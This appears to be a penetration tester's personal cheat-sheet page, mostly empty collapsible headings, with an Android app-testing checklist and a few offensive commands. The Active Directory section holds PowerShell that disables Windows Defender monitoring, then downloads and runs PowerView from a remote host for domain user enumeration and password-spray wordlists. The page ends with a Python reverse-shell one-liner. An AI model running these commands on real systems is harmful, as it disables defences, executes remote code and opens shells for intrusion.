---
layout: page
title: "/brainbox"
permalink: /brainbox/
---

# INFASTRUCTURE

<details><summary> <b>API</b> </summary><blockquote>
  <details><summary>REST</summary><blockquote>
    :smile:
  </blockquote></details>
  <details><summary>SOAP</summary><blockquote>
    :smile:
  </blockquote></details>
</blockquote></details>

<br/>


<details><summary> <b>WEB</b> </summary><blockquote>
    <br/>
Start with automated tools to search for low hanging fruits 
   Burpsuite Scanner
   OWASP Zap 
   Accunetix
   Nikto 
   
   
  <details><summary>SQLi</summary><blockquote>
    :smile:
  </blockquote></details>
  <details><summary>CSRF</summary><blockquote>
    :smile:
  </blockquote></details>
    <details><summary>SSRF</summary><blockquote>
    :smile:
  </blockquote></details>
    <details><summary>IDOR</summary><blockquote>
    :smile:
  </blockquote></details>
    <details><summary>XSS</summary><blockquote>
    :smile:
  </blockquote></details>
    <details><summary>BAC</summary><blockquote>
        Broken Access Control
    :smile:
  </blockquote></details>
    <details><summary>XXE</summary><blockquote>
    :smile:
  </blockquote></details>
    <details><summary>SDE</summary><blockquote>
        secure data exposure
    :smile:
  </blockquote></details>
    <details><summary>CSRF</summary><blockquote>
    :smile:
  </blockquote></details>
    <details><summary>CSRF</summary><blockquote>
    :smile:
  </blockquote></details>
    <details><summary>CSRF</summary><blockquote>
    :smile:
  </blockquote></details>
</blockquote></details>

<br/>

<details><summary> <b>MOBILE</b> </summary><blockquote>
  <details><summary>Android</summary><blockquote>
    ### Checklist
    <br>
1. unzip -d and apktool -d both (different outputs at time)
    <br>
2. check for /assets and /res/raw (api keys, encryption keys)
<br>
    
3. sensitive files and external storage (world readable  & writeable)
    <br>
4. executables & log files on external storage
    <br>
5. look at manifest (WRITE_EXTERNAL_STORAGE)., grep for "getExternal"
    <br>
6. check for installed package "vnd.android.package-archive" (they want to install something)
    <br>
7. hidden directories (.folder)
    <br>
8. api keys saved as bytearray to obfuscate
    <br>
9. identify crypto & understand it
    <br>
10. webSettings.setJavaScriptEnabled(True); means we might be able to XSS
    <br>
11. interesting options: "setAllowContent", "setAllowFileAccess", "setAllowFileAccessFromFileURILS", "setAllowUniversalAccessFromFileURLs", "setJavaScriptEnabled", "setPluginState", "setSavePassword"
    <br>
12. overwriting ssl errors :facepalm:
    <br>
13. xss might allow to call Runtime.getRuntime().exec() (CVE-2012-6636) <= Api17
      <br>                                                                     
14. use Mitm Proxy (mitm.it has the cert)
      <br>                                                                     
    :smile:
  </blockquote></details>
  <details><summary>iOS</summary><blockquote>
    :smile:
  </blockquote></details>
</blockquote></details>

<br/>

<details><summary> <b>*NIX</b> </summary><blockquote>
  <details><summary>Exploitation</summary><blockquote>
    :smile:
  </blockquote></details>
  <details><summary>Privilege Escalation</summary><blockquote>
    :smile:
  </blockquote></details>
    <details><summary>Post Exploitation</summary><blockquote>
    :smile:
  </blockquote></details>
</blockquote></details>

<br/>

<details><summary> <b>WINDOWS</b> </summary><blockquote>
  <details><summary>Exploitation</summary><blockquote>
    :smile:
  </blockquote></details>
  <details><summary>Privilege Escalation</summary><blockquote>
    :smile:
  </blockquote></details>
    <details><summary>Post Exploitation</summary><blockquote>
    :smile:
  </blockquote></details>
</blockquote></details>

<br/>

<details><summary> <b>ACTIVE DIRECTORY</b> </summary><blockquote>
  <details><summary>Initial Access</summary><blockquote>
    :smile:
  </blockquote></details>
  <details><summary>Domain Enumeration And Attack</summary><blockquote>
    :smile:
     # Patch AMSI or disable AV
    <br>
    ```powershell
      Set-MpPreference -DisableRealTimeMonitoring -DisableAVIOProtection $true
      iex(New-Object System.Net.WebClient).downloadString('http:/x.x.x.x./PowerView_Dev.ps1')
    ```
    <br>
    # Get all the users in the domain


    # Get all the users in the domain and pipe their username to build a wordlist that could be used with crackmapexec later for spraying 
    ```powershell
      Get-NetUsers | select samaccountname > username.txt
      
      # Get all the computers in the domain
      Get-NetComputer

      # Get information about specific computer
      Get-NetComputer -Identity <computer_name>
    ```

  </blockquote></details>
    <details><summary>Lateral Movements</summary><blockquote>
    :smile:
  </blockquote></details>
</blockquote></details>
<br/>

<details><summary> <b>CLOUD</b> </summary><blockquote>
  <details><summary>AZURE</summary><blockquote>
    :smile:
  </blockquote></details>
  <details><summary>AWS</summary><blockquote>
    :smile:
  </blockquote></details>
</blockquote></details>

<br/>
<br/>
<br/>


```python
    python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.10.10",9001));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'
```